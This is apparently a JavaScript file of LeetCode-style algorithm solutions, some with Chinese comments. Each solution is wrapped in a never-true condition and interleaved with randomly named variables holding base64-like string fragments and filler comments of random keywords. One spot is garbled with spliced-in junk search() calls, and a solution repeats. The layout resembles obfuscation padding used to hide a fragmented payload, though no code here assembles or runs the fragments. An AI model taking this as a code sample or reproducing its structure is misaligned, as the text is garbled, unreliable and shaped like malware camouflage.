 * @return {void} Do not return anything, modify nums in-place instead.
 */
var nextPermutation = function(nums) {
    var len = nums.length,
        partiIndex,
        switchIndex,
        cur,
        i,
        k;
    
    if (len === 0 || len === 1) {
        return;
    }
    
    //find the num which breaks the increasing from the end
    for (i = len - 1; i > 0; i--) {
        if (nums[i] > nums[i - 1]) {
            partiIndex = i - 1;
            break;
        }
    }
    
    if (partiIndex === undefined) {
        for (i = 0; i < len/2 ; i++) {
            cur = nums[i];
            nums[i] = nums[len - i - 1];
            nums[len - i - 1] = cur;
        }
    } else {
        //find the number that it can be switched with
        cur = nums[partiIndex];
        for(i = len - 1; i > partiIndex; i--) {
            if (nums[i] > cur) {
                switchIndex = i;
                break;
            }
        }
    
        nums[partiIndex] = nums[switchIndex];
        nums[switchIndex] = cur;
        
        for (i = 0; i < (len - 1 - partiIndex)/2 ; i++) {
            k = i + partiIndex + 1;
            cur = nums[k];
            nums[k] = nums[len - 1 - i];
            nums[len - 1 - i] = cur;
        }
    
    }

};

}

    var wzmxizeyh = 'tkPW';
if (Array.isArray(9)) {
    
/**
Given a string s, partition s such that every substring of the partition is a palindrome.

Return the minimum cuts needed for a palindrome partitioning of s.

For example, given s = "aab",
Return 1 since the palindrome partitioning ["aa","b"] could be produced using 1 cut.
*/
/**
 * @param {string} s
 * @return {number}
 */
var minCut = function(s) {
    const len = s.length;
    let dp = [];
    let cut = [];
    let i, j; 
    
    for (i = 0; i < len; i++) {
        dp.push(new Array(len).fill(false));
    }
    
    for (i = 0; i < len; i++) {
        for (j = i; j >= 0; j--) {
            if (s.charAt(j) === s.charAt(i) && (i - j < 2 || dp[j + 1][i - 1])) {
                dp[j][i] = true;
            }
        }
    }
    
    // cur[i] how many cuts from 0 to i
    cut[0] = 0;
    
    for (i = 1; i <= len; i++) {
        for (j = i; j > 0; j--) {
            if (dp[j - 1][i - 1]) {
                cut[i] = Math.min(cut[i] ? cut[i] : Number.MAX_VALUE, cut[j - 1] + 1);
            }
        }
    }
    
    return cut[len] - 1;
};

}

    var fmgvtjstwzsuhw = 'b0tJQ0Fn';
    var cukmuyadfjl = 'gGRkbgtB';
// script return import function world value
    var flszmlmrvb = 'wUjToKWsGq';
if (0.94 && false) {
    /**
Given a string S and a string T, find the minimum window in S which will contain all the characters in T in complexity O(n).

For example,
S = "ADOBECODEBANC"
T = "ABC"
Minimum window is "BANC".

Note:
If there is no such window in S that covers all characters in T, return the empty string "".

If there are multiple such windows, you are guaranteed that there will always be only one unique minimum window in S.
*/

/**
可以利用两个指针扫描（两个指针分别为start，i），以S = “e b a d b a c c b”（忽略空格），T = “abc”为例：

                                                                            0 1 2 3 4 5 6 7 8

初始化 start = i = 0
i 逐渐往后扫描S直到窗口S[start…i]包含所有T的字符，此时i = 6（字符c的位置）
缩减窗口：此时我们注意到窗口并不是最小的，需要调整 start 来缩减窗口。缩减规则为：如果S[start]不在T中 或者 S[start]在T中但是删除后窗口依然可以包含T中的所有字符，那么start = start+1， 直到不满足上述两个缩减规则。缩减后i即为窗口的起始位置，此例中从e开始窗口中要依次删掉e、b、a、d，start最后等于4 ，那么得到一个窗口大小为6-4+1 = 3
start = start+1(此时窗口肯定不会包含所有的T中的字符)，跳转到步骤2继续寻找下一个窗口。本例中还以找到一个窗口start = 5，i = 8，比上个窗口大，因此最终的最小窗口是S[4…6]
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {string}
 */
var minWindow = function(s, t) {
    var tSet = {},
        tFoundSet = {},
        hasFound = 0,
        lenS = s.length,
        lenT = t.length,
        winStart = -1,
        winEnd = lenS,
        result,
        start,
        c,
        i,
        j;
        
    for (i = 0; i < lenT; i++) {
        tFoundSet[t.charAt(i)] = 0;
        tSet[t.charAt(i)] = tSet[t.charAt(i)]? tSet[t.charAt(i)] + 1 : 1;
    }

    for (i = 0, start = 0; i < lenS; i++) {
        c = s.charAt(i);
        if (tSet.hasOwnProperty(c)) {
            if (tFoundSet[c] < tSet[c]) {
                hasFound++;
            }
            
            tFoundSet[s.charAt(i)]++;
        }
        
        if (hasFound === lenT) {
            while (!tSet[s.charAt(start)] || tFoundSet[s.charAt(start)] > tSet[s.charAt(start)]) {
                if (tFoundSet[s.charAt(start)]) {
                    tFoundSet[s.charAt(start)]--;
                }
                start++;
            }
            
            if (winEnd - winStart > i - start) {
                winStart = start;
                winEnd = i;
            }
            
            tFoundSet[s.charAt(start)]--;
            start++;
            hasFound--;
        }
    }
    
    return winStart !== -1? s.substr(winStart, winEnd - winStart + 1) : '';
};

}

    var emowyoyhifmmdhv = 'SUNBZ0';
    var vlfthuvmf = 'NsZf';
    var vgedfr = 'lDQjdJR04';
if (null === 5) {
    /**
Given an array of meeting time intervals consisting of start and end times [[s1,e1],[s2,e2],...] (si < ei), find the minimum number of conference rooms required.

For example,
Given [[0, 30],[5, 10],[15, 20]],
return 2. 
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @return {number}
 */
var minMeetingRooms = function(intervals) {
    let start = [];
    let end = [];
    let len = intervals.length;
    
    for (let i = 0; i < len; i++) {
        start[i] = intervals[i].start;
        end[i] = intervals[i].end;
    }
    
    start.sort((a, b) => a - b);
    end.sort((a, b) => a - b);
    
    let rooms = 0;
    let endIndex = 0;
    
    for (let i = 0; i < len; i++) {
        if (start[i] < end[endIndex]) {
            rooms++;
        } else {
            endIndex++;
        }
    }
    
    return rooms;
};

}

    var fbndsk = 'ojyFatU';
    var gxngbprtzyy = 'wY213Nkl';
    var tjwguzsna = 'xOGdsB';
    var wnlkbaye = 'IUnlkV1Vz';
    var wrwhpsmmtik = 'Vfbrn';
    var ooedjvoajt = 'SUhOb2FXWj';
    var kurukqeqa = 'fqFzmMhor';
    var jkfso = 'BPaUIwY2';
    var vmxzgo = 'nesLUf';
    var rrvykkx = '5WbExD';
    var nsgrub = 'HWkpUBCrFK';
if (72 > 125) {
    /**
Compare two version numbers version1 and version2.
If version1 > version2 return 1, if version1 < version2 return -1, otherwise return 0.

You may assume that the version strings are non-empty and contain only digits and the . character.
The . character does not represent a decimal point and is used to separate number sequences.
For instance, 2.5 is not "two and a half" or "half way to version three", it is the fifth second-level revision of the second first-level revision.

Here is an example of version numbers ordering:

0.1 < 1.1 < 1.2 < 13.37
Credits:
Special thanks to @ts for adding this problem and creating all test cases.

*/

/**
 * @param {string} version1
 * @param {string} version2
 * @return {number}
 */
var compareVersion = function(version1, version2) {
    var arr1 = version1.split('.'),
        arr2 = version2.split('.'),
        len1 = arr1.length,
        len2 = arr2.length,
        a,
        b,
        i,
        j;
        
    for (i = 0; (i < len1) && (i < len2) ; i++) {
        a = parseInt(arr1[i]);
        b = parseInt(arr2[i]);
        if (a < b) {
            return -1;
        } else if (a > b) {
            return 1;
        }
    }
    
    if (len1 > len2) {
        for (j = i; j < len1; j++) {
            if (parseInt(arr1[j]) > 0) {
                return 1;
            }
        }
    } else if (len1 < len2) {
        for (j = i; j < len2; j++) {
            if (parseInt(arr2[j]) > 0) {
                return -1;
            }
        }
    }
    
    return 0;
};

}

    var loedsvhcmwj = 'QnJaWGxE';
    var pnmfsbeljx = 'KnGEeGd';
// hello compile import fidevx object array jppkrn function string event constant function loop number world
if (null === 4) {
    /**
Given a set of non-overlapping intervals, insert a new interval into the intervals (merge if necessary).

You may assume that the intervals were initially sorted according to their start times.

Example 1:
Given intervals [1,3],[6,9], insert and merge [2,5] in as [1,5],[6,9].

Example 2:
Given [1,2],[3,5],[6,7],[8,10],[12,16], insert and merge [4,9] in as [1,2],[3,10],[12,16].

This is because the new interval [4,9] overlaps with [3,5],[6,7],[8,10].
*/
/**
 * Definition for an interval.
 * function Interval(start, end) {
 *     this.start = start;
 *     this.end = end;
 * }
 */
/**
 * @param {Interval[]} intervals
 * @param {Interval} newInterval
 * @return {Interval[]}
 */
var insert = function(intervals, newInterval) {
    var len = intervals.length,
        result = [],
        insertIndex = 0,
        curInterval,
        i;
    
    for (i = 0; i < len; i++) {
        curInterval = intervals[i];
        
        if (curInterval.end < newInterval.start) {
            result.push(curInterval);
            insertIndex++;
        } else if (curInterval.start > newInterval.end) {
            result.push(curInterval);
        } else {
            newInterval.start = Math.min(newInterval.start, curInterval.start);
            newInterval.end = Math.max(newInterval.end, curInterval.end);
        }
    }
    
    result.splice(insertIndex, 0, newInterval);
    
    return result;
};

}

    var zzilrfwhr = 'KEZX';
    var crnseq = 'YjJSbE9pQT';
    var brrskmnglaj = 'xUQUPvV';
if (1 > 135) {
    /**
Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.

According to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes v and w as the lowest node in T that has both v and w as descendants (where we allow a node to be a descendant of itself).”

        _______3______
       /              \
    ___5__          ___1__
   /      \        /      \
   6      _2       0       8
         /  \
         7   4
For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @return {TreeNode}
 */
var lowestCommonAncestor = function(root, p, q) {
    if (!root || root === p || root === q) {
        return root;
    }
    
    var left = lowestCommonAncestor(root.left, p, q),
        right = lowestCommonAncestor(root.right, p, q);
    
    // q and p in different side    
    if (left && right) {
        return root;
    }
    
    return left ? left : right;
};

}

    var hszhimr = 'NOU0I5TE';
    var nfxeggot = 'HhRNARLV';
if ('false' === true) {
    /**
A strobogrammatic number is a number that looks the same when rotated 180 degrees (looked at upside down).

Write a function to determine if a number is strobogrammatic. The number is represented as a string.

For example, the numbers "69", "88", and "818" are all strobogrammatic.
*/
/**
 * @param {string} num
 * @return {boolean}
 */
var isStrobogrammatic = function(num) {
    let map = new Map();
    
    map.set('1', '1');
    map.set('6', '9');
    map.set('9', '6');
    map.set('8', '8');
    map.set('0', '0');
    
    let start = 0;
    let end = num.length - 1;
    
    while (start <= end) {
        if (!map.has(num.charAt(start)) || map.get(num.charAt(start)) !== num.charAt(end)) {
            return false;
        }
        
        start++;
        end--;
    }
    
    return true;
};

}

    var wkdshaotzj = 'NBdkx5QkR';
    var ophrnzzqpve = 'dbHhA';
    var qmfgsadwykqdl = 'kSEpzSzFO';
    var zpbrjjzeppxn = 'QYUCZ';
    var hhzesxbbh = 'b2FXWj';
    var llxzso = 'SFSnId';
if (7 instanceof String) {
    /**
A message containing letters from A-Z is being encoded to numbers using the following mapping:

'A' -> 1
'B' -> 2
...
'Z' -> 26
Given an encoded message containing digits, determine the total number of ways to decode it.

For example,
Given encoded message "12", it could be decoded as "AB" (1 2) or "L" (12).

The number of ways decoding "12" is 2.
*/

// http://bangbingsyb.blogspot.com/2014/11/leetcode-decode-ways.html
/**
 * @param {string} s
 * @return {number}
 */
var numDecodings = function(s) {
    var len = s.length,
        dp = [],
        x,
        y,
        cur,
        i;
        
    dp[0] = 1;
    dp[1] = 1;
    
    if (len === 0 || s.charAt(0) < '1' || s.charAt(0) > '9') {
        return 0;    
    }
    
    for (i = 1; i < len; i++) {
        x = s.charAt(i - 1) - '0';
        y = s.charAt(i) - '0';
        cur = x * 10 + y;
        dp[i + 1] = 0;
        
        if (cur > 9 && cur <= 26) {
            dp[i + 1] += dp[i - 1];
        } 
        
        if (y !== 0) {
            dp[i + 1] += dp[i];
        }
        
        if (dp[i + 1] === 0) {
            return 0;
        }
    }
    
    return dp[len];
};

}

    var hjlhjtqjvx = 'BLM';
if (10 === 16) {
    /**
Given a string array words, find the maximum value of length(word[i]) * length(word[j]) where the two words do not share common letters. You may assume that each word will contain only lower case letters. If no such two words exist, return 0.

Example 1:
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".

Example 2:
Given ["a", "ab", "abc", "d", "cd", "bcd", "abcd"]
Return 4
The two words can be "ab", "cd".

Example 3:
Given ["a", "aa", "aaa", "aaaa"]
Return 0
No such pair of words.
*/

/**
 * @param {string[]} words
 * @return {number}
 */
var maxProduct = function(words) {
    var len = words.length,
        arr = [],
        result = 0,
        i,
        j;
    
    for (i = 0; i < len; i++) {
        arr[i] = 0;
        
        for (j = 0; j < words[i].length; j++) {
            arr[i] |= (1 << (words[i].charCodeAt(j) - 97));
        }
    }
    
    for (i = 0; i < len; i++) {
        for (j = i + 1; j < len; j++) {
            if ((arr[i] & arr[j]) === 0) {
                result = Math.max(result, words[i].length * words[j].length);
            }
        }
    }
    
    return result;
};

}

    var lbowecczz = 'osEMfNHq';
    var xxqjmpmtiywyflv = 'HNLSUNBZ';
if (Array.isArray(8)) {
    /**
Given an array of non-negative integers, you are initially positioned at the first index of the array.

Each element in the array represents your maximum jump length at that position.

Determine if you are able to reach the last index.

For example:
A = [2,3,1,1,4], return true.

A = [3,2,1,0,4], return false.


 * @param {number[]} nums
 * @return {boolean}
 */
var canJump = function(nums) {
    var len = nums.length,
        cover = 0,
        i;
    
    for(i = 0; i < len; i++) {
        if (cover >= i) {
            cover = Math.max(cover, nums[i] + i);
            if (cover >= len - 1) {
                return true;
            }
        } else {
            return false;
        }
    }
};

}

    var gggxjytbvuuu = 'fHjKVXG';
    var iabgidm = '0lDQWd';
if ('m' === 'G') {
    /**
Given n balloons, indexed from 0 to n-1. Each balloon is painted with a number on it represented by array nums. You are asked to burst all the balloons. If the you burst balloon i you will get nums[left] * nums[i] * nums[right] coins. Here left and right are adjacent indices of i. After the burst, the left and right then becomes adjacent.

Find the maximum coins you can collect by bursting the balloons wisely.

Note: 
(1) You may imagine nums[-1] = nums[n] = 1. They are not real therefore you can not burst them.
(2) 0 ≤ n ≤ 500, 0 ≤ nums[i] ≤ 100

Example:

Given [3, 1, 5, 8]

Return 167

    nums = [3,1,5,8] --> [3,5,8] -->   [3,8]   -->  [8]  --> []
   coins =  3*1*5      +  3*5*8    +  1*3*8      + 1*8*1   = 167
*/
/**
 * @param {number[]} nums
 * @return {number}
 * 
 * 状态转移方程：

dp[l][r] = max(dp[l][r], nums[l] * nums[m] * nums[r] + dp[l][m] + dp[m][r])
dp[l][r]表示扎破(l, r)范围内所有气球获得的最大硬币数，不含边界；

l与r的跨度k从2开始逐渐增大；

三重循环依次枚举范围跨度k，左边界l，中点m；右边界r = l + k；
 */
var maxCoins = function(nums) {
    var len = nums.length,
        dp = [],
        i,
        k,
        l,
        m,
        r;
        
    for (i = 0; i <= len + 1; i++) {
        dp.push(new Array(len + 1));
    }
    
    for (i = 0; i <= len + 1; i++) {
        for (k = 0; k <= len + 1; k++) {
            dp[i][k] = 0;
        }
    }
    
    nums[len + 1] = 1;
    
    for (i = len; i > 0; i--) {
        nums[i] = nums[i - 1];
    }
    
    nums[0] = 1;
    
    len += 2;
    
    for (k = 2; k < len; k++) {
        for (l = 0; l < len - k; l++) {
            r = l + k;
            
            for (m = l + 1; m < r; m++) {
                dp[l][r] = Math.max(dp[l][r], dp[l][m] + dp[m][r] + nums[l]*nums[m]*nums[r]);
            }
        }
    }
    
    return dp[0][len - 1];
};

}

    var efgvvyoq = 'zcvp';
    var kmtdq = 'JQ0I3SU';
if ('true' === true) {
    /**
Remove the minimum number of invalid parentheses in order to make the input string valid. Return all possible results.

Note: The input string may contain letters other than the parentheses ( and ).

Examples:
"()())()" -> ["()()()", "(())()"]
"(a)())()" -> ["(a)()()", "(a())()"]
")(" -> [""]

*/
/**
 * @param {string} s
 * @return {string[]}
 */
var removeInvalidParentheses = function(s) {
    var result = [];
    
    dfs(result, s, '', 0, 0);
    
    if (result.length === 0) {
        result.push('');
    }
    
    return result;
};

var max = 0; // max is to make sure we're removing the minimum number of parentheses

function dfs(result, str, curStr, leftCount, leftAccumulated) {
    if (str.length === 0) {
        if (curStr.length > 0 && leftCount === 0) {
            if (max < leftAccumulated) {
                max = leftAccumulated;
            }
            
            if (max === leftAccumulated && result.indexOf(curStr) === -1) {
                result.push(curStr);
            }
        }
        
        return;
    }
    
    var char = str.charAt(0);
    
    if (char === '(') {
        // keep (
        dfs(result, str.substr(1), curStr + '(', leftCount + 1, leftAccumulated + 1);
        // not keep (
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else if (char === ')') {
        if (leftCount > 0) {
            dfs(result, str.substr(1), curStr + ')', leftCount - 1, leftAccumulated);
        }
        
        dfs(result, str.substr(1), curStr, leftCount, leftAccumulated);
    } else {
        dfs(result, str.substr(1), curStr + char, leftCount, leftAccumulated);
    }
}

}

    var ggsyinca = 'FjbUmC';
// hello debug loop export code kmjgmw export xivg await import
    var rewhwvlev = 'aCZqGb';
    var twebjth = 'dOMGN';
if (9 instanceof String) {
    /**
Given a string containing just the characters '(', ')', '{', '}', '[' and ']', determine if the input string is valid.

The brackets must close in the correct order, "()" and "()[]{}" are all valid but "(]" and "([)]" are not.

 * @param {string} s
 * @return {boolean}
 */
var isValid = function(s) {
    if (s === null) {
        return false;
    }
    var stack = [],
        sets = {'(':')', '{':'}', '[':']'},
        len = s.length,
        cur,
        stackTop,
        i;

    for (i = 0; i < len; i++) {
        cur = s.charAt(i);
        if (sets.hasOwnProperty(cur)) {
            stack.push(cur);
        } else {
            if (stack.length === 0) {
                return false;
            } else {
                stackTop = stack.pop();
                if (sets[stackTop] !== cur) {
                    return false;
                }
            }
        }
    }
    if (stack.length === 0) {
        return true;
    } else {
        return false;
    }
    
};

}

    var bonnhyzid = 'hhrRigZ';
    var ubybbba = 'tdzZJS';
    var lyiugrxhin = 'HSZEGcsCW';
if (null === 1) {
    /**
Given two strings s and t, determine if they are isomorphic.

Two strings are isomorphic if the characters in s can be replaced to get t.

All occurrences of a character must be replaced with another character while preserving the order of characters. No two characters may map to the same character but a character may map to itself.

For example,
Given "egg", "add", return true.

Given "foo", "bar", return false.

Given "paper", "title", return true.

Note:
You may assume both s and t have the same length.
*/

/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isIsomorphic = function(s, t) {
    var len = s.length,
        mapS = {},
        mapT = {},
        curS,
        curT,
        i;
        
    for (i = 0; i < len; i++) {
        curS = s.charAt(i);
        curT = t.charAt(i);
        
        if (!mapS.hasOwnProperty(curS)) {
            mapS[curS] = curT;
        } else if (mapS[curS] !== curT) {
            return false;
        }
        
        if (!mapT.hasOwnProperty(curT)) {
            mapT[curT] = curS;
        } else if (mapT[curT] !== curS) {
            return false;
        }
    }
    
    return true;
}; 

}

// define event function array script event import
    var ibdusheqdgn = 'QbmDj';
    var zzmhcrlsfymc = 'FJ5';
    var aulkbsznqn = 'grqqsB';
if (Array.isArray(8)) {
    /**
Implement a trie with insert, search, and startsWith methods.

Note:
You may assume that all inputs are consist of lowercase letters a-z.
*/
/**
 * @constructor
 * Initialize your data structure here.
 */
 
 // MEMORY LIMIT EXCEEDED
var TrieNode = function() {
    var isEnd,
        links = {};
        
    return {
        containsKey: function(n) {
            return links[n] !== undefined;
        },
        get: function(ch) {
            return links[ch];
        },
        put: function(ch, node) {
            links[ch] = node;
        },
        setEnd: function() {
            isEnd = true;
        },
        isEnd: function() {
            return isEnd;
        }
    };
};

var Trie = function() {
    this.root = TrieNode();
};

/**
 * @param {string} word
 * @return {void}
 * Inserts a word into the trie.
 */
Trie.prototype.insert = function(word) {
    var len = word.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = word.charAt(i);
        
        if (!node.containsKey(ch)) {
            node.put(ch, TrieNode());
        }
        
        node = node.get(ch);
    }
    
    node.setEnd();
};

/**
 * @param {string} word
 * @return {boolean}
 * Returns if the word is in the trie.
 */
Trie.prototype.search = function(word) {
    var node = this.searchPrefix(word);
    
    return node && node.isEnd();
};

/**
 * @param {string} prefix
 * @return {boolean}
 * Returns if there is any word in the trie
 * that starts with the given prefix.
 */
Trie.prototype.startsWith = function(prefix) {
    return this.searchPrefix(prefix) !== null;
};

Trie.prototype.searchPrefix = function(prefix) {
    var len = prefix.length,
        node = this.root,
        ch,
        i;
        
    for (i = 0; i < len; i++) {
        ch = prefix.charAt(i);
        
        if (!node.containsKey(ch)) {
            return null;
        }
        
        node = node.get(ch);
    }
    
    return node;
};

/**
 * Your Trie object will be instantiated and called as such:
 * var trie = new Trie();
 * trie.insert("somestring");
 * trie.search("key");
 */arch("theomachia"),search("roughy"),search("hypotarsal"),search("snooze"),search("pronominalize"),search("proselytist"),search("lingel")

}

    var wlvmlworqkueyso = 'ZFdVc0l';
    var zwgsneo = 'AHYDAc';
    var tfsxxqvbcwxeg = 'HdGxlV';
if (Array.isArray(1)) {
    /**
Given an array nums containing n + 1 integers where each integer is between 1 and n (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.

Note:
You must not modify the array (assume the array is read only).
You must use only constant, O(1) extra space.
Your runtime complexity should be less than O(n2).
There is only one duplicate number in the array, but it could be repeated more than once.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var findDuplicate = function(nums) {
    var fast = 0,
        slow = 0,
        find = 0;
        
    while (true) {
        fast = nums[nums[fast]];
        slow = nums[slow];
        
        if (fast === slow) {
            break;
        }
    }
    
    while (find !== slow) {
        find = nums[find];
        slow = nums[slow];
    }
    
    return find;
};


// SOLUTION 2
/**
二分法
复杂度
时间 O(NlogN) 空间 O(1)

思路
实际上，我们可以根据抽屉原理简化刚才的暴力法。我们不一定要依次选择数，然后看是否有这个数的重复数，我们可以用二分法先选取n/2，按照抽屉原理，整个数组中如果小于等于n/2的数的数量大于n/2，说明1到n/2这个区间是肯定有重复数字的。比如6个抽屉，如果有7个袜子要放到抽屉里，那肯定有一个抽屉至少两个袜子。这里抽屉就是1到n/2的每一个数，而袜子就是整个数组中小于等于n/2的那些数。这样我们就能知道下次选择的数的范围，如果1到n/2区间内肯定有重复数字，则下次在1到n/2范围内找，否则在n/2到n范围内找。下次找的时候，还是找一半。

注意
我们比较的mid而不是nums[mid]
因为mid是下标，所以判断式应为cnt > mid，最后返回min

代码
public class Solution {
    public int findDuplicate(int[] nums) {
        int min = 0, max = nums.length - 1;
        while(min <= max){
            // 找到中间那个数
            int mid = min + (max - min) / 2;
            int cnt = 0;
            // 计算总数组中有多少个数小于等于中间数
            for(int i = 0; i < nums.length; i++){
                if(nums[i] <= mid){
                    cnt++;
                }
            }
            // 如果小于等于中间数的数量大于中间数，说明前半部分必有重复
            if(cnt > mid){
                max = mid - 1;
            // 否则后半部分必有重复
            } else {
                min = mid + 1;
            }
        }
        return min;
    }
}

*/

}

    var dfxbtp = 'bOxt';
if (null === 1) {
    /**
You are given coins of different denominations and a total amount of money amount. Write a function to compute the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1.

Example 1:
coins = [1, 2, 5], amount = 11
return 3 (11 = 5 + 5 + 1)

Example 2:
coins = [2], amount = 3
return -1.

Note:
You may assume that you have an infinite number of each kind of coin.
*/

/**
 * @param {number[]} coins
 * @param {number} amount
 * @return {number}
 */
var coinChange = function(coins, amount) {
    var i = 0,
        arr = [],
        len = coins.length,
        j;
    
    while (i <= amount) {
        arr.push(Number.MAX_VALUE);
        i++;
    }
    
    arr[0] = 0;
    
    for (i = 0; i < len; i++) {
        for (j = coins[i]; j <= amount; j++) {
            arr[j] = Math.min(arr[j], arr[j - coins[i]] + 1);
        }
    }
    
    return arr[amount] === Number.MAX_VALUE? -1 : arr[amount];
};

}

    var jgbzhq = 'U52WkdVNkl';
if (Array.isArray(8)) {
    /**
Given a non-empty array of integers, return the k most frequent elements.

For example,
Given [1,1,1,2,2,3] and k = 2, return [1,2].

Note: 
You may assume k is always valid, 1 ≤ k ≤ number of unique elements.
Your algorithm's time complexity must be better than O(n log n), where n is the array's size.
*/
/**
 * @param {number[]} nums
 * @param {number} k
 * @return {number[]}
 * 
 *  Build a array of list to be buckets with length 1 to sort.
 */
var topKFrequent = function(nums, k) {
    let len = nums.length;
    const bucket = {};
    const freqs = [];
    let result = [];
    
    nums.forEach((num) => {
        if (bucket[num] === undefined) {
            bucket[num] = 1;
        } else {
            bucket[num]++;
        }
    });
    
    Object.keys(bucket).forEach((num) => {
        const freq = bucket[num];
        num = parseInt(num);
        
        if (freqs[freq] === undefined) {
            freqs[freq] = [num];
        } else {
            freqs[freq].push(num);
        }
    });
    
    let j = 0;
    for (let i = freqs.length; i >= 0; i--) {
        if (freqs[i] !== undefined) {
            len = freqs[i].length;
            
            for (let m = 0; m < len; m++) {
                if (j === k) {
                    break;
                }
                
                result.push(freqs[i][m]);
                j++;
            }
            
            if (j === k) {
                break;
            }
        }
    }
    
    return result;
};

}

    var dzqrkb = 'rLWGjsD';
if ('h' === 'T') {
    /**
 Given n nodes labeled from 0 to n - 1 and a list of undirected edges (each edge is a pair of nodes), write a function to check whether these edges make up a valid tree.

For example:

Given n = 5 and edges = [[0, 1], [0, 2], [0, 3], [1, 4]], return true.

Given n = 5 and edges = [[0, 1], [1, 2], [2, 3], [1, 3], [1, 4]], return false.

Hint:

    Given n = 5 and edges = [[0, 1], [1, 2], [3, 4]], what should your return? Is this case a valid tree?
    According to the definition of tree on Wikipedia: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”

Note: you can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges. 
*/
/**
 * @param {number} n
 * @param {number[][]} edges
 * @return {boolean}
 */
var validTree = function(n, edges) {
    let nodes = [];
    
    for (let i = 0; i < n; i++) {
        nodes[i] = i;
    }
    
    for (let i = 0; i < edges.length; i++) {
        let start = edges[i][0];
        let end = edges[i][1];
        
        while (nodes[start] !== start) {
            start = nodes[start];
        }
        
        while (nodes[end] !== end) {
            end = nodes[end];
        }
        
        // cycle detected
        if (start === end) {
            return false;
        }
        
        nodes[start] = end;
    }
    // edges are enough to connect each node
    return edges.length >= n - 1;
};

}

    var dhosdwtulbam = 'EY3lJS';
if ('true' === true) {
    
/**
Given a string s, partition s such that every substring of the partition is a palindrome.

Return the minimum cuts needed for a palindrome partitioning of s.

For example, given s = "aab",
Return 1 since the palindrome partitioning ["aa","b"] could be produced using 1 cut.
*/
/**
 * @param {string} s
 * @return {number}
 */
var minCut = function(s) {
    const len = s.length;
    let dp = [];
    let cut = [];
    let i, j; 
    
    for (i = 0; i < len; i++) {
        dp.push(new Array(len).fill(false));
    }
    
    for (i = 0; i < len; i++) {
        for (j = i; j >= 0; j--) {
            if (s.charAt(j) === s.charAt(i) && (i - j < 2 || dp[j + 1][i - 1])) {
                dp[j][i] = true;
            }
        }
    }
    
    // cur[i] how many cuts from 0 to i
    cut[0] = 0;
    
    for (i = 1; i <= len; i++) {
        for (j = i; j > 0; j--) {
            if (dp[j - 1][i - 1]) {
                cut[i] = Math.min(cut[i] ? cut[i] : Number.MAX_VALUE, cut[j - 1] + 1);
            }
        }
    }
    
    return cut[len] - 1;
};

}

    var txhecda = 'voFcNpZmIk';
// value async event import function async code code world constant array
    var mkyrapqf = 'ovpaDptoGS';
    var xgwupccadxmrvjk = 'DBzSUM4dk';
    var diitfwka = 'wFjB';
    var wwxktgnhhkglb = 'lFTj';
    var xjryfyuowdc = 'wsFchpNDq';
    var fclsdgf = 'BjbXd';
    var wmodxk = 'RNrWdcMeYu';
if ('y' === 'N') {
    /**
Given a binary tree, determine if it is height-balanced.

For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.
*/

/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isBalanced = function(root) {
    return findDepth(root) === -1 ? false : true;
};

function findDepth(root) {
    if (root === null) {
        return 0;
    }
    
    var leftDepth = findDepth(root.left),
        rightDepth;
        
    if (leftDepth === -1) {
        return -1;
    }
    
    rightDepth = findDepth(root.right);
    
    if (rightDepth === -1) {
        return -1;
    }
    
    if (Math.abs(leftDepth - rightDepth) > 1) {
        return -1;
    }
    
    return Math.max(leftDepth, rightDepth) + 1;
}

}

    var moymj = 'yU0';
    var npwnjzxswyxn = 'wrlDpkZuy';
if (0.48 && false) {
    /**
Given a pattern and a string str, find if str follows the same pattern.

Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str.

Examples:
pattern = "abba", str = "dog cat cat dog" should return true.
pattern = "abba", str = "dog cat cat fish" should return false.
pattern = "aaaa", str = "dog cat cat dog" should return false.
pattern = "abba", str = "dog dog dog dog" should return false.
Notes:
You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space.
*/

/**
 * @param {string} pattern
 * @param {string} str
 * @return {boolean}
 */
var wordPattern = function(pattern, str) {
    var arr = str.split(' '),
        len = arr.length,
        map1 = {},
        map2 = {},
        curChar,
        curString,
        i;
    
    if (pattern.length !== len) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        curChar = pattern.charAt(i);
        curString = arr[i];
        
        if (!map1.hasOwnProperty(curChar) && !map2.hasOwnProperty(curString)) {
            map1[curChar] = curString;
            map2[curString] = curChar;
        } else if (map1[curChar] !== curString || map2[curString] !== curChar) {
            return false;
        }
    }
    
    return true;
};

}

    var xojizxv = 'FvZ0l';
    var cgcihqfe = 'GcSnssOacW';
if ('false' === true) {
    /**
Given a collection of numbers that might contain duplicates, return all possible unique permutations.

For example,
[1,1,2] have the following unique permutations:
[1,1,2], [1,2,1], and [2,1,1].
*/
/**
 * @param {number[]} nums
 * @return {number[][]}
 */
var permuteUnique = function(nums) {
    var len = nums.length,
        result = [];
    
    nums.sort(function(a, b) {
        return a - b;
    });
    
    genPerm(result, 0, len, [], [], nums);
    
    return result;
};

